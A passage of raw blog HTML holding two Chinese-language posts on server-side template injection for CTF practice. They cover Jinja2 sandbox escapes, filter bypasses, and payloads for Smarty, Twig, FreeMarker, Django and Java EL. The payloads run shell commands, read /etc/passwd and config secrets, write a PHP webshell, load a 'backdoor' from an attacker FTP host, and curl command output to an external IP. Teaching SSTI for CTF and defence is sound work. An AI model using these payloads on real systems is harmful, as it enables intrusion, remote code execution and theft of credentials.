class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(request.args.cmd).read<span class="hljs-literal">()</span> &#125; &#125;&amp;cmd=id</code></pre><h5 id="过滤双下划线"><a class="header-anchor" href="#过滤双下划线">🍭</a>过滤双下划线__</h5><pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">2</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read() &#125; &#125;&amp;class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span></code></pre><h5 id="过滤"><a class="header-anchor" href="#过滤">🍭</a>过滤{ {</h5><pre><code class="hljs clojure">&#123; % if &#x27;&#x27;.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-name">&#x27;curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;).read()==&#x27;p&#x27; % &#125;<span class="hljs-number">1</span>&#123; % endif % &#125;</code></pre><h5 id="reload方法"><a class="header-anchor" href="#reload方法">🍭</a>reload方法</h5><p>CTF题中沙盒环境可能会阉割一些模块，其中内建函数中多半会被删除。如果reload还可以用则可以重载</p><pre><code class="hljs sqf">del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;__import__&#x27;</span>]del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>]del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;execfile&#x27;</span>]<span class="hljs-built_in">reload</span>(<span class="hljs-variable">__builtins__</span>)</code></pre><h5 id="getattribute-方法"><a class="header-anchor" href="#getattribute-方法">🍭</a><code>__getattribute__</code>方法</h5><p>这个方法之前介绍过了，获取属性。</p><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.__getattribute__(<span class="hljs-string">&#x27;func_global&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]<span class="hljs-comment"># 等价于</span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]</code></pre><h5 id="不利用-globals"><a class="header-anchor" href="#不利用-globals">🍭</a>不利用<code>__globals__</code></h5><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre><h5 id="timeit"><a class="header-anchor" href="#timeit">🍭</a>timeit</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> timeittimeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)</code></pre><h5 id="platform"><a class="header-anchor" href="#platform">🍭</a>platform</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> platform<span class="hljs-keyword">print</span> platform.popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()</code></pre><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>ssti有点广，这里提到的一些payload是个大体结构，遇到题目要视情况改编payload进行测试</p><p>参考：</p><p><a href="https://www.anquanke.com/post/id/188172#h3-10">SSTI/沙盒逃逸详情总结</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">一篇文章带你理解漏洞之ssti漏洞</a></p><p><a href="http://www.bubuko.com/infodetail-3516225.html">ssti</a></p><p><a href="https://xz.aliyun.com/t/3679#toc-4">flask之ssti模板注入</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI(一)</title>
    <link href="/2021/04/05/wei/"/>
    <url>/2021/04/05/wei/</url>
    
    <content type="html"><![CDATA[<p><code>Server-Side-Template-Injection</code>，服务端模版注入攻击。</p><p>服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射<code>(ORM)</code>。导致攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ { } }，即可将恶意代码注入模版中执行。<br>现在最常见的模版渲染引擎是基于Python的<code>Flask</code>框架，但是模板注入还存在于许多地方。<code>与 XSS 不同，模板注入可用于直接攻击 Web 服务器的内部，并经常获得远程代码执行，将每个易受攻击的应用程序都转变为潜在的枢轴点。</code>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过.</p><h2 id="模板渲染"><a class="header-anchor" href="#模板渲染">🍭</a>模板渲染</h2><p>模板是用于从数据（变量）到实际的视觉表现（HTML代码）的一种实现手段。</p><h5 id="后端渲染"><a class="header-anchor" href="#后端渲染">🍭</a>后端渲染</h5><p>浏览器直接接收经过服务器计算(服务器经过解析存放在服务器端的模板文件)之后的呈现给用户的最终的HTML字符串，在这种情况下，浏览器<strong>只进行了HTML的解析</strong>，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户.</p><h5 id="前端渲染"><a class="header-anchor" href="#前端渲染">🍭</a>前端渲染</h5><p>浏览器从后端得到一些信息(适用于angularjs的模板文件，或是JSON等各种数据交换格式所包装的数据，合法的HTML字符串)将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示.</p><blockquote><blockquote><p>使用 render_template() 方法来渲染模板:将模板名和你想作为关键字的参数传入模板的变量</p></blockquote></blockquote><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template@app.route(<span class="hljs-string">&#x27;/hello/&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span>)def hello(<span class="hljs-type">name</span>=<span class="hljs-keyword">None</span>):     <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, <span class="hljs-type">name</span>=<span class="hljs-type">name</span>)</code></pre><blockquote><blockquote><p>render_template函数渲染的是templates中的模板,也就是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p></blockquote></blockquote><h4 id="常见模板引擎"><a class="header-anchor" href="#常见模板引擎">🍭</a>常见模板引擎</h4><p><img src="/2021/04/05/wei/1.png" alt="1"></p><p><em>PHP中还有一个Blade ，它和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译。</em></p><p><em>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</em></p><h4 id="PHP实例"><a class="header-anchor" href="#PHP实例">🍭</a>PHP实例</h4><p>将名称传递到模板中：</p><pre><code class="hljs php">$output = $twig-&gt;render(<span class="hljs-string">&quot;Dear &#123;first_name&#125;,&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre><p>允许用户自定义这些电子邮件（开发者将用户的输入直接放在要渲染的字符串中）：</p><pre><code class="hljs php">$output = $twig-&gt;render($_GET[<span class="hljs-string">&#x27;custom_email&#x27;</span>],  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre><p>用户通过custom_email GET 参数控制模板本身的内容，而不是传递给模板的值。</p><h4 id="python实例"><a class="header-anchor" href="#python实例">🍭</a>python实例</h4><p>典型flask:</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string    app = Flask(__name__)<span class="hljs-meta">    @app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>        template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">            &lt;div class=&quot;center-content error&quot;&gt;</span><span class="hljs-string">                &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><span class="hljs-string">                &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">            &lt;/div&gt; </span><span class="hljs-string">        &#x27;&#x27;&#x27;</span> %(request.url)  //程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的<span class="hljs-keyword">return</span> render_template_string(template)    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        app.debug = <span class="hljs-literal">True</span>        app.run()</code></pre><p><code>render_template_string</code>函数在渲染模板时使用%s动态地替换字符串，Flask 中使用Jinja2 作为模板渲染引擎，{ { } }是Jinja2的变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。<strong>flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。</strong></p><blockquote><p><strong>route装饰器路由</strong></p><p><code>@app.route('/')</code></p><blockquote><p>使用route（）装饰器告诉Flask什么样的URL可触发函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span><span class="hljs-string">return 123</span></code></pre><p>访问localhost:5000/则会输出123，修改一下:</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/test&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span><span class="hljs-string">return 123</span></code></pre><p>这时候访问localhost:5000/test会输出123,此外还可以设置动态网址:</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/hello/&lt;username&gt;&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_user</span><span class="hljs-params">(username)</span></span><span class="hljs-symbol">:</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user:%s&quot;</span>%username</code></pre><p>根据url里的输入，动态辨别身份.也可以使用int型，转换器有下面几种：</p><pre><code class="hljs ruby">int      接受整数float    同 int ，但是接受浮点数path     和默认的相似，但也接受斜线@app.route(<span class="hljs-string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_post</span><span class="hljs-params">(post_id)</span></span><span class="hljs-symbol">:</span><span class="hljs-comment"># show the post with the given id, the id is an integer</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Post %d&#x27;</span> % post_id</code></pre></blockquote></blockquote><blockquote><p>main入口</p><blockquote><p>当.py文件被直接运行时，<code>if name == ‘main‘</code>之下的代码块将被运行；当.py文件以模块形式被导入时，<code>if name ==  ‘main‘</code>之下的代码块不被运行小脚本不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 <code>if name ==’main__’  </code>是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。</p></blockquote></blockquote><h4 id="检测"><a class="header-anchor" href="#检测">🍭</a>检测</h4><p>向传递的参数中承载特定 Payload  并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL  注入中有着不同的数据库类型一样。简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析。举例：</p><p><img src="/2021/04/05/wei/3.jpg" alt="3"></p><h2 id="攻击"><a class="header-anchor" href="#攻击">🍭</a>攻击</h2><h4 id="攻击方向-一"><a class="header-anchor" href="#攻击方向-一">🍭</a>攻击方向(一)</h4><ul><li>模板：语法、内置变量、属性、函数</li><li>框架：全局变量、属性、函数</li><li>语言</li><li>应用</li></ul><h4 id="利用模板本身的特性进行攻击"><a class="header-anchor" href="#利用模板本身的特性进行攻击">🍭</a>利用模板本身的特性进行攻击</h4><h5 id="Smarty"><a class="header-anchor" href="#Smarty">🍭</a>Smarty</h5><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)，但实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty  这个类以后我们就去找 smarty 给我们的好用的方法，如：</p><blockquote><p><a href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fgithub.com%2Fsmarty-php%2Fsmarty%2Fblob%2Ffa269d418fb4d3687558746e67e054c225628d13%2Flibs%2Fsysplugins%2Fsmarty_internal_data.php%23L385&amp;r=https%3A%2F%2Fwww.k0rz3n.com%2F2018%2F11%2F12%2F%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E%2F%230X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">getStreamVariable()</a>可以获取传入变量的流（读文件）</p><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a>(写文件)这个类中有一个writeFile方法:</p><p><code>public function writeFile($_filepath, $_contents, Smarty $smarty)</code></p><p>但第三个参数是一个 Smarty 类型</p><p><code>self::clearConfig()</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearConfig</span>(<span class="hljs-params">$varname = <span class="hljs-literal">null</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="hljs-keyword">$this</span>, $varname);&#125;</code></pre><p>payload:</p><pre><code class="hljs php-template"><span class="xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> passthru($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;,self::clearConfig())&#125;</span></code></pre></blockquote><h5 id="Twig"><a class="header-anchor" href="#Twig">🍭</a>Twig</h5><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，不能使用 <code>self::</code> 调用静态变量了，但查询<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>:</p><p><img src="/2021/04/05/wei/4.png" alt="4"></p><p>Twig 提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但有一个 env,env是指属性Twig_Environment对象，Twig_Environment对象有一个  setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置,Twig  的源码中的 environment.php:</p><p><img src="/2021/04/05/wei/5.png" alt="5"></p><p>通过将缓存位置设置为远程服务器来引入远程文件包含漏洞,payload:</p><pre><code class="hljs clojure">&#123; &#123;_self.env.setCache(<span class="hljs-string">&quot;ftp://attacker.net:2121&quot;</span>)&#125; &#125;&#123; &#123;_self.env.loadTemplate(<span class="hljs-string">&quot;backdoor&quot;</span>)&#125; &#125;</code></pre><p>但因allow_url_include 一般是不打开的，没法包含远程文件，故需利用调用过滤器的函数 <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>这个函数中调用了一个 call_user_function 方法</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function"></span>&#123;        [snip]        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filterCallbacks <span class="hljs-keyword">as</span> $callback) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="hljs-comment">//注意这行</span>            <span class="hljs-keyword">return</span> $filter;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerUndefinedFilterCallback</span>(<span class="hljs-params">$callable</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;filterCallbacks[] = $callable;&#125;</code></pre><p>把exec() 作为回调函数传进去即可，payload：</p><pre><code class="hljs clojure">&#123; &#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125; &#125;&#123; &#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125; &#125;</code></pre><h5 id="freeMarker"><a class="header-anchor" href="#freeMarker">🍭</a>freeMarker</h5><p>payload:</p><pre><code class="hljs vim">&lt;#assign <span class="hljs-keyword">ex</span>=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&quot;id&quot;</span>) &#125;</code></pre><h4 id="利用框架本身的特性进行攻击"><a class="header-anchor" href="#利用框架本身的特性进行攻击">🍭</a>利用框架本身的特性进行攻击</h4><h5 id="Django"><a class="header-anchor" href="#Django">🍭</a>Django</h5><p>思路:Django是一个庞大的框架，其数据库关系错综复杂，我们可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，故我们可以去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p><p>Django自带的应用“admin”（后台）的models.py中导入了当前网站的配置文件：</p><p><img src="/2021/04/05/wei/6.png" alt="6"></p><p>思路：通过某种方式找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><p>payload:</p><pre><code class="hljs roboconf">http://localhost:8000/?email=&#123;<span class="hljs-attribute">user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><span class="hljs-attribute"></span><span class="hljs-attribute">http</span>://localhost:8000/?email=&#123;user<span class="hljs-variable">.user_permissions</span><span class="hljs-variable">.model</span><span class="hljs-variable">._meta</span><span class="hljs-variable">.app_config</span><span class="hljs-variable">.module</span><span class="hljs-variable">.admin</span><span class="hljs-variable">.settings</span><span class="hljs-variable">.SECRET_KEY</span>&#125;</code></pre><h4 id="利用模语言本身的特性进行攻击"><a class="header-anchor" href="#利用模语言本身的特性进行攻击">🍭</a>利用模语言本身的特性进行攻击</h4><h5 id="python"><a class="header-anchor" href="#python">🍭</a>python</h5><p><strong>os.system()</strong></p><blockquote><p>用法：os.system(command)</p><blockquote><p>这个调用相当直接，且是同步进行的，程序需要<strong>阻塞</strong>并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。<br>注意：该函数返回命令<strong>执行结果的返回值</strong>，并不是返回命令的执行输出（执行成功返回0，失败返回-1）<br><a href="https://blog.csdn.net/lwgkzl/article/details/81060016">关于linux下os.system()返回值说明</a></p></blockquote></blockquote><p><strong>os.popen()</strong></p><blockquote><p>用法：os.popen(command[,mode[,bufsize]])</p><blockquote><p>说明：<strong>mode</strong> – 模式权限可以是 ‘r’(默认) 或 ‘w’。<br>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。用read()可以把结果回显。</p></blockquote></blockquote><p><strong>subprocess</strong></p><blockquote><p>subprocess 模块有比较多的功能，subprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn、os.popen等<br>subprocess模块目的是<strong>启动一个新的进程并与之通信</strong>。这里只讲用来运行shell命令的两个常用方法。</p><blockquote><p><strong>subprocess.call(“command”)</strong><br>父进程等待子进程完成<br>返回退出信息(returncode，相当于Linux exit code)<br>与os.system功能相似,也无执行结果的回显</p><p><strong>subprocess.Popen(“command”)</strong><br>说明：<code>class subprocess.Popen(args, bufsize=0, executable=None,  stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False,  shell=False, cwd=None, env=None, universal_newlines=False,  startupinfo=None, creationflags=0)</code><br>Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，<strong>它是一个阻塞的方法</strong>，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，<strong>Popen方法也不会打印出cmd的执行信息</strong>。</p></blockquote></blockquote><h5 id="JAVA"><a class="header-anchor" href="#JAVA">🍭</a>JAVA</h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类。</p><p>payload：</p><pre><code class="hljs jboss-cli">$&#123;T<span class="hljs-params">(java.lang.System)</span><span class="hljs-string">.getenv</span><span class="hljs-params">()</span>&#125;$&#123;T<span class="hljs-params">(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;cat etc/passwd&#x27;)</span>&#125;文件操作：$&#123;T<span class="hljs-params">(org.apache.commons.io.IOUtils)</span><span class="hljs-string">.toString</span><span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span><span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(32)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(101)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(112)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(119)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(100)</span>))<span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)&#125;</code></pre><h3 id="攻击方向-二"><a class="header-anchor" href="#攻击方向-二">🍭</a>攻击方向(二)</h3><blockquote><p>查配置文件</p><blockquote><p>常见配置文件:</p><blockquote><p>request</p><p>查看flask文档可知:<code>request</code>是Flask模版的一个全局对象，其代表“当前请求对象(flask.request)”，在视图中访问<code>request</code>对象能看到很多期待的信息。在<code>request</code> 对象中有一个<code>environ</code>对象名。<code>request.environ</code>对象是一个与服务器环境相关的对象字典，字典中一个名为<code>shutdown_server</code>的方法名分配的键为<code>werkzeug.server.shutdown</code>，注射<code>&#123; &#123; request.environ['werkzeug.server.shutdown']() &#125; &#125;</code>在服务端会形成一个影响极低的拒绝服务，使用gunicorn运行应用程序这个方法的效果便消失。</p><p>config</p><p><code>config</code>也是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，<code>SECRET_KEY</code>等敏感值。查看这些配置项目，只需注入<code>&#123; &#123; config.items() &#125; &#125;</code>有效载荷。它的子类包含多个独特的方法：<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, 以及<code>root_path</code></p></blockquote></blockquote></blockquote><blockquote><p>命令执行（沙盒逃逸类题目的利用方式）</p></blockquote><h4 id="查配置文件"><a class="header-anchor" href="#查配置文件">🍭</a>查配置文件</h4><h5 id="Flask-Jinja2"><a class="header-anchor" href="#Flask-Jinja2">🍭</a>Flask/Jinja2</h5><p><strong>模板</strong></p><pre><code class="hljs dust"><span class="hljs-template-variable">&#123; &#123; ... &#125;</span><span class="xml"> &#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span><span class="hljs-template-variable">&#123; % ... % &#125;</span><span class="xml">：装载一个控制语句。</span><span class="hljs-template-variable">&#123; # ... # &#125;</span><span class="xml">：装载一个注释，模板渲染的时候会忽视这中间的值</span></code></pre><p><strong>变量</strong></p><p>在模板中添加变量，可以使用（set）语句。</p><pre><code class="hljs routeros">&#123; % <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;xx&#x27;</span> % &#125;</code></pre><p>with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效</p><pre><code class="hljs clojure">&#123; % with gg = <span class="hljs-number">42</span> % &#125;&#123; &#123; gg &#125; &#125;&#123; % endwith % &#125;</code></pre><p><strong>if语句</strong></p><pre><code class="hljs erlang-repl">&#123; <span class="hljs-comment">% if ken.sick % &#125;</span>Ken is sick.&#123; <span class="hljs-comment">% elif ken.dead % &#125;</span>You killed Ken! You bastard!!!&#123; <span class="hljs-comment">% else % &#125;</span>Kenny looks okay --- so far&#123; <span class="hljs-comment">% endif % &#125;</span></code></pre><p><strong>for语句</strong></p><pre><code class="hljs routeros">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-keyword">in</span><span class="hljs-built_in"> users </span>% &#125;&#123; &#123; user.username|e &#125; &#125;&#123; % endfor % &#125;</code></pre><p>遍历</p><pre><code class="hljs xquery">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>my_dict.iteritems()<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span> % &#125;&amp;<span class="hljs-literal">lt</span>;dt&amp;<span class="hljs-literal">gt</span>;&#123; &#123;<span class="hljs-built_in"> key</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dt&amp;<span class="hljs-literal">gt</span>;&amp;<span class="hljs-literal">lt</span>;dd&amp;<span class="hljs-literal">gt</span>;&#123; &#123; <span class="hljs-keyword">value</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dd&amp;<span class="hljs-literal">gt</span>;&#123; % endfor % &#125;</code></pre><p>Jinja2中for循环内置常量</p><ul><li><p>loop.index 当前迭代的索引（从1开始）</p></li><li><p>loop.index0 当前迭代的索引（从0开始）</p></li><li><p>loop.first 是否是第一次迭代，返回True/False</p></li><li><p>loop.last 是否是最后一次迭代，返回True/False</p></li><li><p>loop.length 序列的长度</p></li></ul><p>注意：不可以使用continue和break表达式来控制循环的执行。</p><p><strong>过滤器</strong></p><p>过滤器是通过（|）符号进行使用的，例如：{ { name|length } }：将返回name的长度</p><p>类似于我们平常的的函数，他他这种应该就是内置函数，因为它本身就含有很多过滤器</p><pre><code class="hljs pgsql">abs(<span 